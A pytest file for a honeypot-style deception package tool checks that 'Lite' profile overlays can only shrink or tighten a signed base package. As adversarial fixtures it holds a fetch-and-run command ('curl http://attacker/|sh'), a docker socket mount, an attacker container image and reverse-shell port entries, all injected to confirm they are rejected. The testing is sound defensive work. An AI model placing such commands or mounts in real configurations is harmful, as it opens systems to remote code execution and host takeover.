"""Deception#35 AC-3/AC-4: bounded Lite profiles, proven to be reductions.

The property under test is one sentence: **an overlay can remove and tighten,
and can do nothing else.** It is attacked from three directions here.

1. *Exhaustively*, over every selection the base package admits. The base has a
   small component/surface/credential set, so "every subset" is enumerable and
   the proof is complete for this package rather than sampled.
2. *Adversarially*, one test per dimension the issue names — services, images,
   ports, routes, DNS, mounts, capabilities, commands, credentials, resources.
3. *Schema-independently*, because four of those ten dimensions have no field
   in `deception-package/v0.1` at all.
"""

from __future__ import annotations

import copy
import itertools
from pathlib import Path

import pytest

from azazel_deception.overlay import (
    BOOT_EMERGENCY_LITE,
    CEILING_FIELDS,
    NEXUS_EMBEDDED_LITE,
    EvidenceBudget,
    ProfileOverlay,
    ResourceCeiling,
    assert_is_reduction,
    render_profile,
)
from azazel_deception.package import (
    PackageValidationError,
    load_package,
    require_valid_package,
)

PACKAGE_PATH = Path(__file__).resolve().parents[1] / "examples" / "packages" / "municipal-linux-v1" / "package.yaml"
PROFILES = (NEXUS_EMBEDDED_LITE, BOOT_EMERGENCY_LITE)


@pytest.fixture(scope="module")
def base() -> dict:
    return load_package(PACKAGE_PATH)


@pytest.fixture(scope="module")
def base_payload(base) -> dict:
    return require_valid_package(base).model_dump(mode="json")


def overlay_for(base_payload, **changes) -> ProfileOverlay:
    fields = dict(
        profile_id="test-profile",
        base_package_id=base_payload["package_id"],
        base_package_digest=base_payload["package_digest"],
        keep_components=("intranet-web",),
        keep_surfaces=("intranet-web-http",),
        keep_credentials=(),
        ceiling=ResourceCeiling(),
        evidence=EvidenceBudget(1000, 1024, 3600),
    )
    fields.update(changes)
    return ProfileOverlay(**fields)


# -- the two named profiles -------------------------------------------------


@pytest.mark.parametrize("profile", PROFILES, ids=lambda p: p.profile_id)
def test_each_named_profile_renders_and_is_a_reduction(profile, base):
    rendered = render_profile(base, profile)

    assert rendered["profile_id"] == profile.profile_id
    assert rendered["base_package_digest"] == profile.base_package_digest
    assert_is_reduction(base, rendered)


@pytest.mark.parametrize("profile", PROFILES, ids=lambda p: p.profile_id)
def test_each_named_profile_declares_a_finite_evidence_budget(profile, base):
    """AC-3: "finite resource/evidence budgets". Unbounded evidence is how
    hostile telemetry consumes Core reserves."""
    budget = render_profile(base, profile)["evidence_budget"]

    assert budget["max_observation_events"] > 0
    assert budget["max_observation_bytes"] > 0
    assert budget["max_retention_seconds"] > 0


@pytest.mark.parametrize("field", ["max_observation_events", "max_observation_bytes", "max_retention_seconds"])
@pytest.mark.parametrize("bad", [0, -1])
def test_an_unbounded_or_negative_evidence_budget_is_refused(field, bad):
    values = {"max_observation_events": 1, "max_observation_bytes": 1, "max_retention_seconds": 1}
    values[field] = bad
    with pytest.raises(PackageValidationError, match="not bounded"):
        EvidenceBudget(**values)


def test_the_rendered_manifest_carries_its_own_digest_over_the_reduced_payload(base):
    """The rendering is a derived artifact: a consumer verifies the signed base
    first and the reduction second, so the two digests must differ and both
    must be present."""
    rendered = render_profile(base, NEXUS_EMBEDDED_LITE)

    assert rendered["manifest"]["package_digest"] != rendered["base_package_digest"]
    assert rendered["base_package_digest"] == NEXUS_EMBEDDED_LITE.base_package_digest


def test_boot_lite_is_at_or_below_nexus_lite_on_every_axis(base):
    """Boot runs on borrowed hardware. It may not be the more permissive of
    the two on any dimension."""
    nexus = render_profile(base, NEXUS_EMBEDDED_LITE)
    boot = render_profile(base, BOOT_EMERGENCY_LITE)

    for field in CEILING_FIELDS:
        n = nexus["manifest"]["maximum_budget"].get(field)
        b = boot["manifest"]["maximum_budget"].get(field)
        if n is None or b is None:
            continue
        assert b <= n, f"boot-emergency-lite is more permissive than nexus on {field}"
    for key, value in boot["evidence_budget"].items():
        assert value <= nexus["evidence_budget"][key], f"boot retains more evidence on {key}"


# -- exhaustive: every selection the package admits --------------------------


def _all_component_selections(base_payload):
    ids = [c["component_id"] for c in base_payload["components"]]
    for size in range(1, len(ids) + 1):
        yield from itertools.combinations(ids, size)


def _all_surface_selections(base_payload):
    ids = sorted(
        s["surface_id"] for c in base_payload["components"] for s in c.get("surfaces", [])
    )
    for size in range(len(ids) + 1):
        yield from itertools.combinations(ids, size)


def test_every_admissible_selection_renders_to_a_reduction(base, base_payload):
    """Exhaustive over the cross product of component and surface subsets.

    Selections the package forbids (dropping a required component, leaving no
    deployable tier) are expected to raise; what must never happen is a
    rendering that succeeds and is not a reduction.
    """

    rendered_count = 0
    for components in _all_component_selections(base_payload):
        for surfaces in _all_surface_selections(base_payload):
            overlay = overlay_for(
                base_payload, keep_components=components, keep_surfaces=surfaces
            )
            try:
                rendered = render_profile(base, overlay)
            except PackageValidationError:
                continue
            assert_is_reduction(base, rendered)
            rendered_count += 1
    assert rendered_count >= 2, (
        f"only {rendered_count} selections rendered; the sweep is not exercising anything"
    )


def test_every_admissible_ceiling_renders_to_a_reduction(base, base_payload):
    """Sweep each budget axis down from the base's own value."""
    rendered_count = 0
    for field in CEILING_FIELDS:
        original = base_payload["maximum_budget"].get(field)
        if original is None:
            continue
        for divisor in (1, 2, 4, 1000):
            value = type(original)(original / divisor) if divisor != 1 else original
            overlay = overlay_for(base_payload, ceiling=ResourceCeiling(**{field: value}))
            try:
                rendered = render_profile(base, overlay)
            except PackageValidationError:
                continue
            assert_is_reduction(base, rendered)
            assert rendered["manifest"]["maximum_budget"][field] <= original
            rendered_count += 1
    assert rendered_count >= 6, f"only {rendered_count} ceilings rendered"


def test_a_ceiling_above_the_base_is_clamped_not_honoured(base, base_payload):
    """The overlay cannot widen even by asking: the render takes the minimum."""
    original = base_payload["maximum_budget"]["memory_mb"]
    overlay = overlay_for(base_payload, ceiling=ResourceCeiling(memory_mb=original * 10))

    rendered = render_profile(base, overlay)

    assert rendered["manifest"]["maximum_budget"]["memory_mb"] == original


# -- adversarial: one per dimension the issue names -------------------------


def test_an_overlay_cannot_name_a_service_the_package_lacks(base, base_payload):
    with pytest.raises(PackageValidationError, match="does not have"):
        render_profile(base, overlay_for(base_payload, keep_components=("intranet-web", "smuggled-c2")))


def test_an_overlay_cannot_name_a_port_the_package_does_not_expose(base, base_payload):
    with pytest.raises(PackageValidationError, match="does not expose"):
        render_profile(base, overlay_for(base_payload, keep_surfaces=("intranet-web-http", "reverse-shell-4444")))


def test_an_overlay_cannot_name_a_credential_the_package_does_not_carry(base, base_payload):
    with pytest.raises(PackageValidationError, match="does not carry"):
        render_profile(base, overlay_for(base_payload, keep_credentials=("domain-admin",)))


def test_an_overlay_cannot_drop_a_required_component(base, base_payload):
    """A profile without the package's required components is a different
    package, not a reduction of this one."""
    with pytest.raises(PackageValidationError, match="required"):
        render_profile(base, overlay_for(base_payload, keep_components=("evidence-sidecar-placeholder",)))


def test_an_overlay_cannot_bind_to_a_different_package(base, base_payload):
    with pytest.raises(PackageValidationError, match="different package digest"):
        render_profile(base, overlay_for(base_payload, base_package_digest="sha256:" + "f" * 64))
    with pytest.raises(PackageValidationError, match="not"):
        render_profile(base, overlay_for(base_payload, base_package_id="some-other-package"))


def test_an_overlay_that_leaves_no_deployable_tier_is_refused(base, base_payload):
    """Found by the guard rather than assumed: this package's own `lite` tier
    declares it needs 100 connections, so a ceiling below that is not a
    reduction -- it is a promise the workload never made."""
    overlay = overlay_for(base_payload, ceiling=ResourceCeiling(max_connections=25))

    with pytest.raises(PackageValidationError, match="no deployment tier"):
        render_profile(base, overlay)


def _rendered(base):
    return render_profile(base, NEXUS_EMBEDDED_LITE)


@pytest.mark.parametrize(
    "dimension,mutate",
    [
        (
            "service",
            lambda m, b: m["components"].append(copy.deepcopy(b["components"][1])),
        ),
        (
            "image",
            lambda m, b: m["components"][0]["image"].update(
                {"image": "ghcr.io/attacker/payload@sha256:" + "a" * 64}
            ),
        ),
        (
            "port",
            lambda m, b: m["components"][0]["surfaces"].append(
                {"surface_id": "extra", "protocol": "tcp", "port": 4444, "service": "shell"}
            ),
        ),
        (
            "capability",
            lambda m, b: m["components"][0].update({"privileged": True}),
        ),
        (
            "rootfs",
            lambda m, b: m["components"][0].update({"read_only_rootfs": False}),
        ),
        (
            "resources",
            lambda m, b: m["maximum_budget"].update({"memory_mb": 1_000_000}),
        ),
        (
            "safety",
            lambda m, b: m["safety"].update({"outbound_allowed": True}),
        ),
        (
            "tier",
            lambda m, b: m["deployment_tiers"].append(copy.deepcopy(b["deployment_tiers"][1])),
        ),
    ],
)
def test_a_hand_edited_rendering_that_widens_is_caught(dimension, mutate, base, base_payload):
    """`assert_is_reduction` is independent of `render_profile`.

    A rendering someone produced by other means -- by hand, by a future tool,
    by a compromised builder -- is held to the same rule.
    """

    rendered = _rendered(base)
    mutate(rendered["manifest"], base_payload)

    with pytest.raises(PackageValidationError):
        assert_is_reduction(base, rendered)


@pytest.mark.parametrize(
    "dimension,injection",
    [
        ("route", {"routes": ["0.0.0.0/0 via 10.0.0.1"]}),
        ("dns", {"dns": ["attacker.example.invalid"]}),
        ("mount", {"mounts": ["/var/run/docker.sock:/var/run/docker.sock"]}),
        ("command", {"command": ["/bin/sh", "-c", "curl http://attacker/|sh"]}),
    ],
)
def test_a_dimension_the_schema_does_not_model_still_cannot_be_introduced(
    dimension, injection, base
):
    """The four dimensions with no field in `deception-package/v0.1`.

    Rather than invent schema for them, the check proves something stronger:
    every string in the rendering already appeared in the signed package. A
    route, a DNS name, a mount, or a command has to arrive as a string that
    was not there before, so none can -- whether or not the schema ever learns
    to model it.
    """

    rendered = _rendered(base)
    rendered["manifest"]["components"][0].update(injection)

    with pytest.raises(PackageValidationError, match="introduces strings"):
        assert_is_reduction(base, rendered)


def test_the_string_guard_is_not_vacuous(base):
    """Guard the guard: an untouched rendering must pass it.

    Without this, a check that rejected everything would look like a working
    check in every test above.
    """

    assert_is_reduction(base, _rendered(base))


# -- the dedicated checks, exercised where the string guard cannot help ------
#
# A tamper that introduces a new string is caught by the schema-independent
# guard, which made the tests above pass even with the dedicated image and port
# checks disabled. These two tamper using only material already present in the
# signed package, so the string guard is silent and the dedicated check is the
# only thing standing between the rendering and a widening.


def test_swapping_in_another_image_from_the_same_package_is_caught(base, base_payload):
    """Every string here is already in the base, so the generic guard cannot
    see this. It is still a different image than the one authored for this
    component."""
    rendered = _rendered(base)
    other_image = copy.deepcopy(base_payload["components"][1]["image"])
    rendered["manifest"]["components"][0]["image"] = other_image

    with pytest.raises(PackageValidationError, match="changes the image"):
        assert_is_reduction(base, rendered)


def test_moving_an_existing_surface_to_another_port_is_caught(base):
    """A port is a number, so opening a new one need introduce no new string."""
    rendered = _rendered(base)
    surface = rendered["manifest"]["components"][0]["surfaces"][0]
    surface["port"] = 4444

    with pytest.raises(PackageValidationError, match="opens a port"):
        assert_is_reduction(base, rendered)


def test_widening_a_budget_to_another_number_already_in_the_package_is_caught(base, base_payload):
    """Same shape on the resource axis: the base's own `standard` tier numbers
    are legitimate values elsewhere in the document."""
    rendered = _rendered(base)
    rendered["manifest"]["maximum_budget"]["memory_mb"] = (
        base_payload["maximum_budget"]["memory_mb"] + 1
    )

    with pytest.raises(PackageValidationError, match="widens the resource ceiling"):
        assert_is_reduction(base, rendered)
